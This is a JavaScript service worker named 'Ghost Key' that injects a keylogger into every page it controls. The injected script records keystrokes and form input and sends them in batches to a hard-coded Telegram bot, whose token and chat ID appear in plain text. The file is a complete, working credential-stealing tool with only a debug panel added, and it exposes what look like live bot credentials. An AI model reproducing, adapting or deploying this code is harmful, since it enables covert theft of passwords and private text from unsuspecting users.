// ===== SERVICE WORKER =====
const BOT_TOKEN = "8910457881:AAE9TznGCDNXkAxuo3Js_A1HaRVppAvhJuo";
const CHAT_ID = "1431950109";

// Install SW
self.addEventListener('install', event => {
    console.log('✅ SW installed');
    self.skipWaiting();
});

// Activate SW
self.addEventListener('activate', event => {
    console.log('✅ SW activated');
    event.waitUntil(clients.claim());
});

// ===== INTERCEPT REQUESTS — INJECT KEYLOGGER =====
self.addEventListener('fetch', event => {
    const url = event.request.url;

    if (event.request.mode === 'navigate' && event.request.destination === 'document') {
        event.respondWith(
            fetch(event.request).then(response => {
                return response.text().then(html => {
                    // Inject keylogger script with debug
                    const inject = `
                        <script>
                            // ===== DEBUG =====
                            function debug(msg) {
                                const el = document.getElementById('debug');
                                if (el) {
                                    const time = new Date().toLocaleTimeString();
                                    el.innerHTML = \`[\${time}] \${msg}\n\` + el.innerHTML;
                                    if (el.innerHTML.split('\\n').length > 20) {
                                        el.innerHTML = el.innerHTML.split('\\n').slice(0, 20).join('\\n');
                                    }
                                }
                                console.log(msg);
                            }

                            // Add debug panel if not exists
                            if (!document.getElementById('debug')) {
                                const div = document.createElement('div');
                                div.id = 'debug';
                                div.style.cssText = \`
                                    position: fixed;
                                    bottom: 10px;
                                    left: 10px;
                                    right: 10px;
                                    background: rgba(0,0,0,0.9);
                                    color: #00ff88;
                                    font-family: monospace;
                                    font-size: 12px;
                                    padding: 10px;
                                    border-radius: 8px;
                                    max-height: 150px;
                                    overflow-y: auto;
                                    z-index: 9999;
                                    border: 1px solid #00ff88;
                                    white-space: pre-wrap;
                                    word-wrap: break-word;
                                \`;
                                div.innerHTML = '🟢 Ghost Key injected on this page';
                                document.body.appendChild(div);
                            }

                            debug("🔍 Ghost Key injected on this page");

                            const BOT_TOKEN = "${BOT_TOKEN}";
                            const CHAT_ID = "${CHAT_ID}";
                            let buffer = "";
                            let timer = null;
                            const IDLE_TIME = 10000;

                            function sendToTelegram(msg) {
                                if (msg.trim() === "") return;
                                debug("📤 Sending: " + msg);
                                fetch(\`https://api.telegram.org/bot\${BOT_TOKEN}/sendMessage\`, {
                                    method: 'POST',
                                    headers: { 'Content-Type': 'application/json' },
                                    body: JSON.stringify({
                                        chat_id: CHAT_ID,
                                        text: "📱 Keylog: " + msg
                                    })
                                }).then(res => res.json()).then(data => {
                                    if (data.ok) {
                                        debug("✅ Sent successfully!");
                                    } else {
                                        debug("❌ Telegram error: " + data.description);
                                    }
                                }).catch(err => {
                                    debug("❌ Network error: " + err.message);
                                });
                            }

                            function resetTimer() {
                                if (timer) clearTimeout(timer);
                                timer = setTimeout(() => {
                                    if (buffer.length > 0) {
                                        debug("⏰ Auto-sending: " + buffer);
                                        sendToTelegram(buffer);
                                        buffer = "";
                                    }
                                }, IDLE_TIME);
                            }

                            // ===== KEYDOWN =====
                            document.addEventListener('keydown', (e) => {
                                const key = e.key;
                                debug("🔑 Keydown: " + key);

                                if (key === "Enter") {
                                    if (buffer.length > 0) {
                                        debug("⌨️ Enter pressed, sending: " + buffer);
                                        sendToTelegram(buffer);
                                        buffer = "";
                                    }
                                    if (timer) clearTimeout(timer);
                                    return;
                                }
                                if (key === "Backspace") {
                                    buffer = buffer.slice(0, -1);
                                    debug("⬅️ Backspace, buffer: " + buffer);
                                } else if (key.length === 1) {
                                    buffer += key;
                                    debug("✏️ Char: " + key + ", buffer: " + buffer);
                                }
                                resetTimer();
                            });

                            // ===== INPUT EVENT =====
                            document.addEventListener('input', (e) => {
                                if (e.target.tagName === 'INPUT' || e.target.tagName === 'TEXTAREA') {
                                    const val = e.target.value;
                                    debug("📝 Input changed: " + val);
                                    if (val.length > buffer.length) {
                                        const newChar = val.slice(-1);
                                        buffer += newChar;
                                        resetTimer();
                                    } else if (val.length < buffer.length) {
                                        buffer = val;
                                        resetTimer();
                                    }
                                }
                            });

                            debug("✅ Ghost Key active on this page");
                        <\/script>
                    `;

                    const modifiedHtml = html.replace('</body>', inject + '</body>');
                    return new Response(modifiedHtml, {
                        headers: response.headers,
                        status: response.status,
                        statusText: response.statusText
                    });
                });
            })
        );
    }
});

console.log('✅ Ghost Key SW loaded');
